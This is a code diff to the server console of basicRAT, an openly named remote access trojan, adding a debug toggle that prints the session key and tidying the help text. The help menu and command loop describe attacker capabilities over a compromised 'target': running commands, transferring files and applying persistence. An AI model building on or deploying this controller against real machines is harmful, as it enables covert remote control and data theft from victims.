@@ -13,6 +13,8 @@ import struct
 import sys
 import time
 
+from binascii import hexlify
+
 from core import common
 from core.file import recvfile, sendfile
 
@@ -30,12 +32,13 @@ BANNER = '''
          https://github.com/vesche/basicRAT
 '''
 HELP_TEXT = '''
-download <files> - Download file(s).
+debug           - Toggle debug mode
+download <files>- Download file(s).
 help            - Show this help menu.
 persistence     - Apply persistence mechanism.
 rekey           - Regenerate crypto key.
 run <command>   - Execute a command on the target.
-upload <files>   - Upload files(s).
+upload <files>  - Upload files(s).
 quit            - Gracefully kill client and server.
 '''
 
@@ -54,6 +57,7 @@ def main():
     args    = vars(parser.parse_args())
     port    = args['port']
     crypto  = args['crypto']
+    debug = False
 
     if crypto == 'AES':
         from core.crypto import diffiehellman
@@ -79,7 +83,7 @@ def main():
     
     DHKEY = diffiehellman(conn, server=True)
     # debug: confirm DHKEY matches
-    # print binascii.hexlify(DHKEY)
+    if debug: print "Diffie Key: {}".format(hexlify(DHKEY))
     
     while True:
         prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
@@ -125,6 +129,11 @@ def main():
         # available in case a fallback occurs or you suspect eavesdropping
         elif cmd == 'rekey':
             DHKEY = diffiehellman(conn, server=True)
+            if debug: print "Diffie Key: {}".format(hexlify(DHKEY))
+
+        elif cmd == "debug":
+            debug = not debug
+            print "Debug mode set to {}".format(bool(debug))
             
         # results of persistence
         elif cmd == 'persistence':
